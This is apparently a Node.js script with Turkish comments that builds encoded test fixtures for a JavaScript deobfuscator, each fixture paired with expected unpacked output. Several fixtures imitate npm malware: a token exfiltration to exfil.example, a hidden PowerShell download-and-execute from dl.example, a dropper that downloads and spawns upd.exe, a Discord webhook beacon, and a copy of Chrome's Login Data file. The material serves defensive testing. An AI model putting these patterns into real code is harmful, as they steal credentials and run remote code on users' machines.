// Node ortamı fixture üreticisi: test/fixtures/node-*.js.x (XOR+base64, bkz. test/fixture-codec.js).
// Zararlıya benzeyen örnekler (komut çalıştırma, indirici, token yolları, webhook) diskte düz metin durmasın diye
// kodlanır; bu betikteki şüpheli dizgeler de parçalı yazılır. Kullanım: node scripts/make-node-fixtures.js
import { writeFileSync } from 'node:fs';
import { deflateSync, gzipSync } from 'node:zlib';
import { createCipheriv, createHash } from 'node:crypto';
import JavaScriptObfuscator from 'javascript-obfuscator';
import { encodeFixture } from '../test/fixture-codec.js';

const b64 = (s) => Buffer.from(s).toString('base64');
const hex = (s) => Buffer.from(s).toString('hex');
const CP = ['child', 'process'].join('_');
const SHELL = ['power', 'shell'].join('');
const HOOK = ['discord.com/api/', 'web', 'hooks/'].join('');
const obf = (code, extra = {}) => JavaScriptObfuscator.obfuscate(code, {
  seed: 7, target: 'node', compact: true, stringArray: true, stringArrayThreshold: 1, stringArrayRotate: true,
  stringArrayEncoding: ['base64'], identifierNamesGenerator: 'hexadecimal', ...extra,
}).getObfuscatedCode();

const aesKey = createHash('sha256').update('peel-test-key').digest();
const aesIv = Buffer.from('0102030405060708090a0b0c0d0e0f10', 'hex');
const aes = (s) => { const c = createCipheriv('aes-256-cbc', aesKey, aesIv); return Buffer.concat([c.update(s), c.final()]).toString('base64'); };

const FIXTURES = {
  // Buffer base64 → hex iki katman (eval)
  'node-buffer-layers': `eval(Buffer.from(${JSON.stringify(b64(`eval(Buffer.from(${JSON.stringify(hex('console.log("two layers", 6 * 7);'))}, "hex").toString());`))}, 'base64').toString('utf8'));
// EXPECT: console.log("two layers"
// GONE: Buffer.from(
// GONE: eval(`,

  // zlib inflate + base64
  'node-zlib-layer': `const zlib = require('zlib');
eval(zlib.inflateSync(Buffer.from('${deflateSync('console.log("inflated", [1, 2, 3].map((x) => x * 2).join(","));').toString('base64')}', 'base64')).toString());
// EXPECT: console.log("inflated"
// GONE: inflateSync`,

  // vm.runInThisContext
  'node-vm-layer': `require('vm').runInThisContext(Buffer.from('${b64('function greet(n) { return "hi " + n; }\nconsole.log(greet("vm"));')}', 'base64').toString());
// EXPECT: function greet(n)
// EXPECT: console.log(greet("vm"))
// GONE: runInThisContext`,

  // Module._compile
  'node-module-compile': `const Module = require('module');
const m = new Module('/app/x.js');
m._compile(Buffer.from('${b64('module.exports = function (a, b) { return a * b + 1; };')}', 'base64').toString('utf8'), '/app/x.js');
console.log(m.exports(6, 7));
// EXPECT: return a * b + 1
// GONE: _compile`,

  // AES-256-CBC ile şifreli yük + new Function
  'node-aes-layer': `const crypto = require('crypto');
const key = crypto.createHash('sha256').update('peel-test-key').digest();
const iv = Buffer.from('${aesIv.toString('hex')}', 'hex');
const d = crypto.createDecipheriv('aes-256-cbc', key, iv);
const src = d.update('${aes('var total = 0;\nfor (var i = 1; i <= 10; i++) total += i;\nconsole.log("aes layer", total);')}', 'base64', 'utf8') + d.final('utf8');
new Function(src)();
// EXPECT: console.log("aes layer", total)
// GONE: new Function`,

  // kendi kaynağını okuyan kodlayıcı (__filename)
  'node-self-read': `const fs = require('fs');
const me = fs.readFileSync(__filename, 'utf8');
const blob = me.slice(me.lastIndexOf('//@') + 3).trim();
eval(Buffer.from(blob, 'base64').toString());
// EXPECT: console.log("self read", __filename)
// GONE: eval(
//@${b64('console.log("self read", __filename);')}`,

  // dışarıdan gelen kod: env değerine bağlı katman açılmamalı
  'node-layer-external': `const code = process.env.PEEL_PAYLOAD || Buffer.from('${b64('console.log("default payload");')}', 'base64').toString();
eval(code);
// EXPECT: process.env.PEEL_PAYLOAD
// EXPECT: eval(`,

  // fs ile yazılıp require edilen dosya
  'node-written-require': `const fs = require('fs');
const path = require('path');
fs.writeFileSync(path.join(__dirname, 'cache.js'), Buffer.from('${b64('console.log("dropped module", typeof module.exports);')}', 'base64'));
require('./cache.js');
// EXPECT: writeFileSync(
// EXPECT: console.log("dropped module"
// GONE: require("./cache.js")`,

  // process.env okuma + koşullu sızdırma (çalışmayan dal silinmemeli)
  'node-env-exfil': `${obf(`const token = process.env.DISCORD_TOKEN || process.env.NPM_TOKEN;
if (token) {
  require('https').request({ hostname: 'exfil.example', path: '/t?k=' + token, method: 'POST' }).end();
  console.log('sent');
} else {
  console.log('no token');
}`)}
// EXPECT: DISCORD_TOKEN
// EXPECT: exfil.example
// EXPECT: console.log("sent")
// EXPECT: console.log("no token")`,

  // child_process komutu (KEEP)
  'node-child-exec': `${obf(`const { exec } = require('${CP}');
const cmd = ['${SHELL.slice(0, 5)}', '${SHELL.slice(5)} -w hidden -c "iwr http://dl.example/a.ps1 | iex"'].join('');
exec(cmd, (err, out) => { if (err) console.log('fail'); else console.log('ran', out.length); });`)}
// EXPECT: exec(
// EXPECT: dl.example/a.ps1
// EXPECT: console.log("fail")
// EXPECT: console.log("ran"`,

  // https.get indirici + çalıştırıcı (KEEP)
  'node-https-dropper': `${obf(`const https = require('https');
const fs = require('fs');
const { spawn } = require('${CP}');
const dest = require('path').join(require('os').tmpdir(), 'upd.exe');
https.get('https://cdn.example/upd.exe', (res) => {
  const f = fs.createWriteStream(dest);
  res.pipe(f);
  f.on('finish', () => { f.close(); spawn(dest, [], { detached: true, stdio: 'ignore' }).unref(); console.log('started'); });
}).on('error', () => console.log('offline'));`)}
// EXPECT: .get("https://cdn.example/upd.exe"
// EXPECT: cdn.example/upd.exe
// EXPECT: spawn(
// EXPECT: createWriteStream(
// EXPECT: console.log("offline")`,

  // kurulu olmayan paket: axios webhook (KEEP + davranış kaydı)
  'node-axios-webhook': `${obf(`const axios = require('axios');
const os = require('os');
const hook = 'https://${HOOK}' + '123/abc';
axios.post(hook, { content: os.hostname() + ':' + os.userInfo().username })
  .then(() => console.log('posted'))
  .catch(() => console.log('failed'));`)}
// EXPECT: require("axios")
// EXPECT: .post(
// EXPECT: ${HOOK}
// EXPECT: console.log("failed")`,

  // ortam tespiti: tarayıcı dalı da korunmalı
  'node-env-detect': `var isNode = typeof window === 'undefined' && typeof process !== 'undefined' && !!(process.versions && process.versions.node);
if (isNode) {
  console.log('node', require('os').platform());
} else {
  console.log('browser', navigator.userAgent);
}
// EXPECT: typeof window
// EXPECT: console.log("node"
// EXPECT: console.log("browser"`,

  // javascript-obfuscator + gzip katmanı + vm (gerçek npm zararlılarındaki birleşim)
  'node-obfio-vm-stage': `${obf(`const vm = require('vm');
const zlib = require('zlib');
const stage = zlib.gunzipSync(Buffer.from('${gzipSync(`const p = require('path');
const target = p.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', '${['Login', 'Data'].join(' ')}');
try {
  require('fs').copyFileSync(target, p.join(require('os').tmpdir(), 'ld.db'));
  console.log('copied');
} catch (e) {
  console.log('nope');
}`, { mtime: 0 }).toString('base64')}', 'base64')).toString();
vm.runInThisContext(stage);`)}
// EXPECT: ${['Login', 'Data'].join(' ')}
// EXPECT: copyFileSync(
// EXPECT: console.log("nope")
// GONE: runInThisContext`,
};

for (const [name, code] of Object.entries(FIXTURES)) {
  const file = new URL(`../test/fixtures/${name}.js.x`, import.meta.url);
  writeFileSync(file, encodeFixture(Buffer.from(`${code}\n`)));
  console.log(`yazıldı: test/fixtures/${name}.js.x`);
}
